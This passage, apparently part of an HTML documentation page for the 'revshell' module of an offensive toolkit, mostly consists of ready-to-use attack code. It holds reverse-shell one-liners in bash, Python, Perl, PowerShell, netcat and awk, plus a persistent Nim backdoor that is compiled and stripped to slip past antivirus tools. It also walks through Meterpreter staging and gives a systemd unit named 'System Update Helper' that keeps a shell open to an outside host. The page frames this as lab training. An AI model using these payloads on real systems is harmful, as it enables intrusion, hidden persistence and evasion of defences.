+[1] uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+
+        <h3>Generate a Python3 one-liner for a TryHackMe box</h3>
+        <pre><code>secV (revshell) ❯ <span class="kw">set</span> mode generate
+secV (revshell) ❯ <span class="kw">set</span> lhost 10.10.14.5
+secV (revshell) ❯ <span class="kw">set</span> lport 4444
+secV (revshell) ❯ <span class="kw">set</span> shell python3
+secV (revshell) ❯ <span class="kw">run</span> target
+
+<span class="comment"># Output (paste on the target):</span>
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</code></pre>
+
+        <h3>PowerShell evasion for a Windows box</h3>
+        <pre><code>secV (revshell) ❯ <span class="kw">set</span> shell powershell_b64
+secV (revshell) ❯ <span class="kw">set</span> lhost 10.10.14.5
+secV (revshell) ❯ <span class="kw">run</span> target
+
+<span class="comment"># Paste the powershell -EncodedCommand ... output on the Windows target</span></code></pre>
+
+        <h3>Nim binary for a Linux target (no Python needed on target)</h3>
+        <pre><code>secV (revshell) ❯ <span class="kw">set</span> mode nim_backdoor
+secV (revshell) ❯ <span class="kw">set</span> lhost 10.10.14.5
+secV (revshell) ❯ <span class="kw">set</span> lport 4444
+secV (revshell) ❯ <span class="kw">set</span> target_os linux
+secV (revshell) ❯ <span class="kw">run</span> target
+
+<span class="comment"># Then start a listener and deliver the binary to the target:</span>
+secV (revshell) ❯ <span class="kw">set</span> mode serve
+secV (revshell) ❯ <span class="kw">run</span> target</code></pre>
+
+        <h3>Use from another module — android_pentest shell operation</h3>
+        <pre><code>secV ❯ <span class="kw">use</span> android_pentest
+secV (android_pentest) ❯ <span class="kw">set</span> operation shell
+secV (android_pentest) ❯ <span class="kw">set</span> lhost 10.10.14.5
+secV (android_pentest) ❯ <span class="kw">set</span> lport 4444
+secV (android_pentest) ❯ <span class="kw">run</span> device
+<span class="comment"># android_pentest calls revshell internally; handler starts automatically</span></code></pre>
+      </section>
+
+      <!-- ═══════════════════════════ ARCHITECTURE DEEP DIVE ═══════════════════════════ -->
+      <section id="arch">
+        <p class="sec-label">Internals</p>
+        <h2>Architecture Deep Dive</h2>
+        <p>
+          This section explains exactly what happens at the byte level when a reverse shell connects,
+          how the Nim backdoor is compiled, and why the multi-handler approach is superior to single
+          connection listeners.
+        </p>
+      </section>
+
+      <section id="tcp-protocol">
+        <p class="sec-label">Internals</p>
+        <h2>TCP Reverse Shell — Wire Protocol</h2>
+        <p>
+          A raw TCP reverse shell is the simplest payload type: the victim opens a TCP socket to
+          the attacker and connects stdin/stdout/stderr to it. Let's trace every byte.
+        </p>
+        <pre><code><span class="comment">## What happens when a bash reverse shell payload runs</span>
+<span class="comment">## Payload (injected on victim): bash -i >& /dev/tcp/attacker-ip/4444 0>&1</span>
+
+<span class="comment"># 1. Victim OS calls: socket(AF_INET, SOCK_STREAM, 0)</span>
+<span class="comment"># 2. Victim calls: connect(sock, {attacker_ip, 4444})</span>
+
+<span class="comment">## TCP 3-way handshake (bytes on the wire):</span>
+Victim → Attacker:  [SYN]  seq=0x4a3f2b1c
+Attacker → Victim:  [SYN-ACK] seq=0x11223344, ack=0x4a3f2b1d
+Victim → Attacker:  [ACK] ack=0x11223345
+
+<span class="comment"># 3. Victim calls: dup2(sock, 0) dup2(sock, 1) dup2(sock, 2)</span>
+<span class="comment">#    → stdin(0), stdout(1), stderr(2) all point to the TCP socket</span>
+<span class="comment"># 4. Victim calls: execve("/bin/bash", ["-i"], env)</span>
+
+<span class="comment">## Now the TCP session IS the bash session:</span>
+Attacker → Victim:  "id\n"                  <span class="comment"># attacker types command</span>
+Victim → Attacker:  "uid=1000(user) ...\n"  <span class="comment"># bash executes, output travels back</span>
+
+<span class="comment">## No encryption, no framing — raw bytes both ways</span>
+<span class="comment">## This is why raw TCP shells are caught by IDS: plain-text commands visible</span></code></pre>
+
+        <h3>One-Line Payload Variants by Language</h3>
+        <pre><code><span class="comment">## bash</span>
+bash -i >& /dev/tcp/LHOST/LPORT 0>&1
+
+<span class="comment">## Python 3</span>
+python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('LHOST',LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
+
+<span class="comment">## Perl</span>
+perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+<span class="comment">## PowerShell (Windows)</span>
+$c=New-Object Net.Sockets.TCPClient("LHOST",LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()
+
+<span class="comment">## nc with -e (GNU netcat)</span>
+nc LHOST LPORT -e /bin/bash
+
+<span class="comment">## nc without -e (OpenBSD netcat — most common)</span>
+mkfifo /tmp/f; nc LHOST LPORT < /tmp/f | /bin/bash > /tmp/f 2>&1; rm /tmp/f
+<span class="comment"># mkfifo creates a FIFO pipe; nc reads from it while bash writes to it — bidirectional</span></code></pre>
+
+        <h3>Why mkfifo Works</h3>
+        <pre><code><span class="comment">## mkfifo pipe trick — explained</span>
+mkfifo /tmp/f
+<span class="comment">#           /tmp/f (FIFO pipe in filesystem)</span>
+<span class="comment">#            ↑              ↓</span>
+nc LHOST LPORT &lt; /tmp/f   |   /bin/bash &gt; /tmp/f 2&gt;&amp;1
+<span class="comment">#  ↑                              ↑</span>
+<span class="comment"># nc reads from FIFO           bash writes output to FIFO</span>
+<span class="comment"># (attacker's keystrokes        (bash results go into the FIFO)</span>
+<span class="comment">#  flow: nc stdout → pipe → bash stdin)</span>
+<span class="comment">#</span>
+<span class="comment"># The pipe | connects nc's output (what attacker types) to bash's stdin</span>
+<span class="comment"># bash's stdout/stderr go to /tmp/f, which nc reads and sends to attacker</span>
+<span class="comment"># Result: bidirectional shell over one nc connection</span></code></pre>
+      </section>
+
+      <section id="meterpreter-staging">
+        <p class="sec-label">Internals</p>
+        <h2>Meterpreter Staging — How it Works</h2>
+        <p>
+          The <code>msf_*</code> payload types in revshell generate <strong>staged</strong> payloads.
+          Staging is a two-step delivery system that keeps the initial payload small.
+        </p>
+        <pre><code><span class="comment">## Staged payload delivery timeline</span>
+
+T=0:  secV generates stager via msfvenom
+      msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=x LPORT=y -f elf -o shell
+      <span class="comment"># Output is ~250 bytes of x64 shellcode wrapped in an ELF</span>
+
+T=1:  Victim executes the stager ELF
+      stager calls: socket() → connect(LHOST:LPORT) → recv(4096)
+
+T=2:  MSF handler sends Stage 1 — the Meterpreter core
+      <span class="comment"># ~300KB of compiled C (meterpreter.lso / metsrv.x64.dll on Windows)</span>
+      <span class="comment"># Linux: metsrv.so — a shared library loaded by the stager via mmap</span>
+
+T=3:  Stager maps Stage 1 into memory:
+      mmap(NULL, stage_size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANON|MAP_PRIVATE, -1, 0)
+      memcpy(addr, stage1_bytes, stage_size)
+      call addr   <span class="comment"># jump into Stage 1</span>
+      <span class="comment"># No file is written to disk — pure in-memory execution</span>
+
+T=4:  Meterpreter core establishes TLV command channel
+      <span class="comment"># All future commands (sysinfo, upload, shell, etc.) go via TLV over the same TCP</span>
+
+T=5:  Extensions loaded on demand:
+      <span class="comment"># "load stdapi" → MSF sends stdapi.so over TLV → mmap + dlopen</span>
+      <span class="comment"># Each capability is a loadable .so — only downloaded when needed</span></code></pre>
+
+        <h3>mmap + execute — Why it Bypasses AV</h3>
+        <p>
+          Traditional antivirus scans files on disk. Meterpreter's stager never writes Stage 1 to disk:
+          it maps anonymous memory (<code>MAP_ANON</code>), copies the bytes in, and jumps to the entry
+          point. Modern EDR tools that monitor <code>mmap(PROT_EXEC)</code> syscalls can detect this,
+          which is why Meterpreter also supports HTTP/HTTPS transport — the stage bytes look like a normal
+          web download until they're executed in memory.
+        </p>
+      </section>
+
+      <section id="nim-backdoor-internals">
+        <p class="sec-label">Internals</p>
+        <h2>Nim Backdoor — Compilation Pipeline</h2>
+        <p>
+          The <code>nim_backdoor</code> mode compiles a custom reverse shell binary from Nim source code.
+          Nim is chosen for three reasons: (1) its compiler generates native C code which is then compiled
+          by gcc/clang — the final binary has no Nim runtime signature; (2) Nim's FFI lets you call raw
+          POSIX/WinAPI functions directly; (3) AV tools have almost no signatures for Nim-compiled binaries.
+        </p>
+        <pre><code><span class="comment">## Nim → C → Binary compilation pipeline</span>
+
+Input:  nim source (revshell.nim)
+          ↓
+Step 1: nim c --cc:gcc --opt:speed -d:release revshell.nim
+          → Nim compiler outputs C source to ~/.cache/nim/revshell_d/
+          → C code is standard POSIX/WinAPI calls — no Nim stdlib visible
+
+Step 2: gcc compiles the C output:
+          gcc -O2 -o revshell ~/.cache/nim/revshell_d/*.c
+          → strips debug symbols
+          → links only libc (no unusual shared libs)
+
+Step 3: secV strips the binary:
+          strip revshell
+          → removes symbol table (function names invisible to AV heuristics)
+
+Output: ~150KB statically compiled ELF (Linux) or PE (Windows with MinGW cross-compile)</code></pre>
+
+        <h3>The Nim Source secV Generates</h3>
+        <pre><code><span class="comment">## Template expanded by secV with LHOST/LPORT substituted</span>
+import net, osproc, os, posix
+
+proc reverseShell(host: string, port: int) =
+  <span class="comment"># Connect back to attacker</span>
+  let sock = newSocket()
+  sock.connect(host, Port(port))
+
+  <span class="comment"># Fork a shell and connect it to the socket</span>
+  let (rfd, wfd) = (sock.getFd(), sock.getFd())
+  discard dup2(rfd, 0)  <span class="comment"># stdin  ← socket</span>
+  discard dup2(wfd, 1)  <span class="comment"># stdout → socket</span>
+  discard dup2(wfd, 2)  <span class="comment"># stderr → socket</span>
+  discard execv("/bin/sh", ["/bin/sh", "-i"])
+
+while true:
+  try:
+    reverseShell("LHOST", LPORT)
+  except:
+    sleep(5000)  <span class="comment"># retry on disconnect — persistent</span></code></pre>
+
+        <h3>Cross-Compilation for Windows Targets</h3>
+        <pre><code><span class="comment">## Compile Nim reverse shell targeting Windows from Linux</span>
+nim c \
+  --cpu:amd64 \
+  --os:windows \
+  --cc:gcc \
+  --gcc.exe:x86_64-w64-mingw32-gcc \
+  --gcc.linkerexe:x86_64-w64-mingw32-gcc \
+  -d:release \
+  --opt:speed \
+  --out:shell.exe \
+  revshell.nim
+
+<span class="comment"># Requires: sudo apt install gcc-mingw-w64-x86-64</span>
+<span class="comment"># Output: shell.exe — native Windows PE, ~200KB, no Nim DLL dependency</span>
+<span class="comment"># secV automatically detects --target windows and uses this cross-compile path</span></code></pre>
+      </section>
+
+      <section id="handler-internals">
+        <p class="sec-label">Internals</p>
+        <h2>Multi-Session Handler — How the Listener Works</h2>
+        <p>
+          The revshell <code>serve</code> mode starts a TCP listener that handles multiple simultaneous
+          connections. Each connection is an independent session managed in a separate thread.
+        </p>
+        <pre><code><span class="comment">## revshell listener internals (simplified Python)</span>
+import socket, threading, select
+
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+<span class="comment"># SO_REUSEADDR: allows re-binding the port immediately after restart</span>
+<span class="comment"># without waiting for TIME_WAIT state (2× MSL ≈ 2 minutes on Linux)</span>
+server.bind(("0.0.0.0", LPORT))
+server.listen(50)    <span class="comment"># backlog: 50 pending connections</span>
+
+sessions = {}        <span class="comment"># {session_id: socket}</span>
+
+def handle_session(sid, sock):
+    sessions[sid] = sock
+    while True:
+        ready, _, _ = select.select([sock], [], [], 1.0)
+        if ready:
+            data = sock.recv(4096)
+            if not data: break   <span class="comment"># connection closed</span>
+            <span class="comment"># store data, stream to GUI via SSE</span>
+
+while True:
+    conn, addr = server.accept()
+    sid = f"sess_{len(sessions)+1}"
+    t = threading.Thread(target=handle_session, args=(sid, conn))
+    t.daemon = True
+    t.start()
+    <span class="comment"># This is why ExitOnSession false matters: single accept() loop keeps running</span></code></pre>
+
+        <h3>Session Upgrade: Raw Shell → Meterpreter</h3>
+        <p>
+          A raw TCP shell (bash) has no file transfer, no port forwarding, no screenshot capability.
+          Upgrading it to Meterpreter adds all these without restarting:
+        </p>
+        <pre><code><span class="comment">## In revshell handler TUI: select a raw bash session</span>
+sessions          <span class="comment"># list all sessions</span>
+interact 1        <span class="comment"># enter session 1 (bash shell)</span>
+<span class="comment">## Now in raw bash on victim. Upgrade:</span>
+background        <span class="comment"># background bash session</span>
+
+<span class="comment">## In MSF (opened automatically by revshell if msf_handler operation used):</span>
+use post/multi/manage/shell_to_meterpreter
+set SESSION 1
+set LHOST bore.pub
+set LPORT 4445     <span class="comment"># second bore tunnel for Meterpreter</span>
+run
+
+<span class="comment">## What happens:</span>
+<span class="comment"># 1. MSF sends a stager script down the bash session (Python/Perl one-liner)</span>
+<span class="comment"># 2. Script runs on victim: connects back on LPORT 4445</span>
+<span class="comment"># 3. MSF sends Meterpreter Stage 1 (metsrv.so) over the new connection</span>
+<span class="comment"># 4. metsrv.so maps itself into memory, establishes TLV channel</span>
+<span class="comment"># 5. You now have a full Meterpreter session</span>
+sessions          <span class="comment"># shows new Meterpreter session alongside old bash session</span></code></pre>
+      </section>
+
+      <section id="revshell-customization">
+        <p class="sec-label">Extend</p>
+        <h2>Customization &amp; Extension</h2>
+
+        <h3>Adding a New Payload Type</h3>
+        <p>
+          Each payload type in revshell is a function that returns a shell-executable string or a
+          binary file path. Adding a new type requires one dict entry in <code>PAYLOAD_GENERATORS</code>
+          and optionally a compilation function:
+        </p>
+        <pre><code><span class="comment"># In revshell.py — PAYLOAD_GENERATORS dict</span>
+PAYLOAD_GENERATORS = {
+    "bash":    lambda lh, lp: f"bash -i >& /dev/tcp/{lh}/{lp} 0>&1",
+    "python3": lambda lh, lp: f"python3 -c \"import socket...\"",
+    <span class="comment"># ── Add your type: ──</span>
+    "awk": lambda lh, lp: (
+        f"awk 'BEGIN {{s=\"/inet/tcp/0/{lh}/{lp}\"; "
+        f"while(42) {{do{{printf \"> \" |& s; s |& getline c; "
+        f"while ((c |& getline) > 0) print $0 |& s; close(c)}} while(c != \"exit\")}}}'"
+    ),
+}
+
+<span class="comment"># awk reverse shell works on any system with gawk (GNU awk)</span>
+<span class="comment"># /inet/tcp/ is a gawk extension for TCP sockets</span></code></pre>
+
+        <h3>Writing a Custom Handler Hook</h3>
+        <p>
+          revshell fires hooks on session events. You can attach custom logic to these:
+        </p>
+        <pre><code><span class="comment"># on_session_open: fires when a new connection is accepted</span>
+def my_on_open(session_id: str, peer_addr: str, sock):
+    print(f"[+] Session {session_id} opened from {peer_addr}")
+    <span class="comment"># Auto-run recon commands on new sessions:</span>
+    sock.send(b"id; uname -a; whoami\n")
+
+<span class="comment"># Register the hook in revshell.py:</span>
+HOOKS = {
+    "on_session_open":  my_on_open,
+    "on_session_close": lambda sid, peer: print(f"[-] Session {sid} closed"),
+    "on_command":       lambda sid, cmd: print(f"[>] {sid}: {cmd}"),
+    "on_output":        lambda sid, data: None,   <span class="comment"># output handler</span>
+}
+
+<span class="comment"># Hooks run in the session's thread — keep them fast</span>
+<span class="comment"># For slow operations (logging to DB, sending alerts), use threading.Thread</span></code></pre>
+
+        <h3>Persistent Reconnect Agent (Drop-and-forget)</h3>
+        <p>
+          For long-term access on a compromised Linux machine, this systemd unit file makes your
+          reverse shell reconnect automatically after reboot or disconnect:
+        </p>
+        <pre><code><span class="comment">## /etc/systemd/system/secv-agent.service</span>
+[Unit]
+Description=System Update Helper
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/bore.pub/38521 0>&1; sleep 30; done'
+Restart=always
+RestartSec=10
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=multi-user.target
+
+<span class="comment">## Install:</span>
+systemctl daemon-reload
+systemctl enable secv-agent
+systemctl start secv-agent
+
+<span class="comment">## The service will restart within 30 seconds of any disconnect</span>
+<span class="comment">## Description says "System Update Helper" to blend in with system services</span></code></pre>
+
+        <div class="callout" style="border-color: rgba(251,191,36,0.4)">
+          <span class="callout-mark">!</span>
+          <span>Only install persistence mechanisms on systems you own or have explicit written
+          authorization to test. Unauthorized persistence is a criminal offense in most jurisdictions.</span>
+        </div>
+      </section>
+
+      <section id="learning-path">
+        <p class="sec-label">Study</p>
+        <h2>Learning Path &amp; Resources</h2>
+        <p>
+          Build your knowledge of shells, networking, and post-exploitation from the ground up.
+        </p>
+
+        <h3>Step 1: Understand the Basics — Networks and Processes</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Resource</th><th>Type</th><th>Why</th></tr></thead>
+          <tbody>
+            <tr><td>Computer Networking: A Top-Down Approach (Kurose &amp; Ross)</td><td>Book</td><td>Understand TCP/IP at a fundamental level. Chapters 1-3 cover everything behind reverse shells — sockets, TCP, ports.</td></tr>
+            <tr><td>Linux Command Line (No Starch, free PDF)</td><td>Free</td><td>Bash, file descriptors (stdin/stdout/stderr), pipes, processes — the building blocks of shell payloads.</td></tr>
+            <tr><td>TCP/IP Illustrated (Stevens)</td><td>Book</td><td>The definitive TCP reference. Explains exactly what happens when a socket connects — essential for understanding why shells work.</td></tr>
+          </tbody>
+        </table>
+        </div>
+
+        <h3>Step 2: Shell Practice Labs</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Platform</th><th>Cost</th><th>Focus</th></tr></thead>
+          <tbody>
+            <tr><td>TryHackMe — "What the Shell?" room</td><td>Free</td><td>Hands-on room specifically about reverse and bind shells. Covers every one-liner in this doc. Start here.</td></tr>
+            <tr><td>HackTheBox Starting Point machines</td><td>Free</td><td>Each machine requires a shell. Walk-throughs show the full process: scan → exploit → shell → escalate.</td></tr>
+            <tr><td>Metasploitable 2/3 (VM)</td><td>Free</td><td>Intentionally vulnerable Linux VM. Get a shell via vsftpd exploit, then practice upgrading to Meterpreter.</td></tr>
+            <tr><td>VulnHub (vulnhub.com)</td><td>Free</td><td>Download vulnerable VMs. Filter by beginner/intermediate. Perfect for practising the full shell chain locally.</td></tr>
+          </tbody>
+        </table>
+        </div>
+
+        <h3>Step 3: Essential References</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Resource</th><th>Use For</th></tr></thead>
+          <tbody>
+            <tr><td>GTFOBins (gtfobins.github.io)</td><td>Every Unix binary that can spawn a shell, read files, or escalate privileges. Essential reference when you have limited access.</td></tr>
+            <tr><td>PayloadsAllTheThings — Reverse Shell Cheat Sheet</td><td>All one-liner reverse shells by language. Reference when the standard bash shell doesn't work.</td></tr>
+            <tr><td>Metasploit Unleashed (offensive-security.com/metasploit-unleashed)</td><td>Free course on Metasploit. Covers msfvenom, handlers, sessions, post-exploitation — directly relevant to revshell's msf_* modes.</td></tr>
+            <tr><td>Nim language tour (nim-lang.org/docs/tut1.html)</td><td>Learn Nim syntax to write custom backdoor payloads using revshell's nim_backdoor mode.</td></tr>
+          </tbody>
+        </table>
+        </div>
+
+        <h3>Step 4: Deep Books</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Book</th><th>Level</th><th>Best For</th></tr></thead>
+          <tbody>
+            <tr><td>Penetration Testing (Georgia Weidman, No Starch)</td><td>Beginner-Intermediate</td><td>Full penetration testing methodology using Metasploit. Covers shell acquisition, privilege escalation, pivoting.</td></tr>
+            <tr><td>The Hacker Playbook 3 (Peter Kim)</td><td>Intermediate</td><td>Red team techniques including C2 frameworks, shell evasion, lateral movement with shells.</td></tr>
+            <tr><td>Black Hat Python (Seitz &amp; Arnold)</td><td>Intermediate</td><td>Build your own network tools and shells in Python. Write custom handlers beyond what revshell provides.</td></tr>
+          </tbody>
+        </table>
+        </div>
+
+        <h3>Practice Path</h3>
+        <pre><code><span class="comment">## Progression: from your first shell to advanced C2</span>
+
+Week 1: Your First Shell
+  Setup: Kali VM + Metasploitable 2 VM (lab-setup.html)
+  Run: nmap on Metasploitable — find vsftpd 2.3.4
+  Use: revshell serve mode to catch the shell
+  Goal: get uid=0(root) on Metasploitable
+
+Week 2: Shell Upgrade Chain
+  Start with a raw netcat shell on any machine
+  Practice: python3 pty upgrade → rlwrap → stty rows/cols
+  Then: upgrade to Meterpreter via MSF shell_to_meterpreter
+  Goal: full interactive Meterpreter from a raw nc shell
+
+Week 3: Evasion Basics
+  Compile: nim_backdoor for Linux
+  Test: does AV flag it? (upload to virustotal — educational only)
+  Modify: change function names, add junk code, recompile
+  Goal: understand what makes binaries detectable
+
+Week 4: C2 Architecture
+  Run: revshell in serve mode with multiple sessions
+  Practice: background sessions, exec-all, session management
+  Then: set up a bore tunnel and practice WAN delivery</code></pre>
+      </section>
+
+      <!-- Dependencies -->
+      <section id="deps">
+        <p class="sec-label">Setup</p>
+        <h2>Dependencies</h2>
+
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Tool</th><th>Required</th><th>Purpose</th><th>Install</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><code>python3</code></td>
+              <td>Required</td>
+              <td>Module runtime</td>
+              <td>Pre-installed on most distros</td>
+            </tr>
+            <tr>
+              <td><code>nim</code></td>
+              <td>Optional</td>
+              <td><code>nim_backdoor</code> compilation</td>
+              <td><code>sudo pacman -S nim</code> / <code>sudo apt install nim</code></td>
+            </tr>
+            <tr>
+              <td><code>msfvenom</code></td>
+              <td>Optional</td>
+              <td>MSF payload types (msf_elf, msf_exe, msf_apk)</td>
+              <td>Included with Metasploit — <code>sudo apt install metasploit-framework</code></td>
+            </tr>
+            <tr>
+              <td><code>nc</code> / <code>ncat</code></td>
+              <td>Optional</td>
+              <td>Netcat payload generation</td>
+              <td><code>sudo apt install netcat-openbsd ncat</code></td>
+            </tr>
+          </tbody>
+        </table>
+        </div>
+
+        <div class="callout">
+          <span class="callout-mark">i</span>
+          <span>revshell's core <code>serve</code> and <code>generate</code> modes have no external dependencies beyond Python 3. Nim and Metasploit are only needed for the respective optional payload types.</span>
+        </div>
+      </section>
+
+    </div><!-- /content -->
+  </div><!-- /doc-body -->
+</div><!-- /page -->
+
+<footer>
+  <div class="foot-inner">
+    <a class="foot-brand" href="../index.html">SECVULNHUB</a>
+    <div class="foot-links">
+      <a class="foot-link" href="../index.html">Home</a>
+      <a class="foot-link" href="https://github.com/secvulnhub" target="_blank">GitHub</a>
+      <a class="foot-link" href="../index.html#modules">Modules</a>
+    </div>
+    <span class="foot-note">secV v2.4.2 — revshell v1.0.1</span>
+  </div>
+</footer>
+
+<script>
+const nav = document.getElementById('nav');
+window.addEventListener('scroll', () => { nav.classList.toggle('scrolled', window.scrollY > 20); });
+document.getElementById('burger').addEventListener('click', () => { document.body.classList.toggle('nav-open'); });
+const links = document.querySelectorAll('.sidebar-nav a');
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      links.forEach(l => l.classList.remove('active'));
+      const match = document.querySelector(`.sidebar-nav a[href="#${e.target.id}"]`);
+      if (match) match.classList.add('active');
+    }
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+document.querySelectorAll('section[id]').forEach(s => observer.observe(s));
+</script>
+</body>
+</html>
